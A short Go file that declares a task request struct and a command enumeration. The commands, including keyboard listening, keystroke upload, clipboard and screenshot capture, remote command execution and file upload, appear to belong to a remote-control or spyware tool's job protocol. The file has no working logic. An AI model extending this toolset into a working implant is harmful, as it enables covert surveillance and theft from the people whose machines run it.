package definition

type Request struct {
	TaskID string `json:"task_id"`
	Cmd    Cmd    `json:"cmd"`
	Param  string `json:"param"`
}

type Cmd int

const (
	UploadFile = iota
	GetFileContent
	KeyboardInputRecordUpload
	TestUpload
	GetClipboard
	GetScreenshot
	ExecCommand
	GetProcessList
	ListenKeyboard
	OK
	Reset
	DefaultTask
)
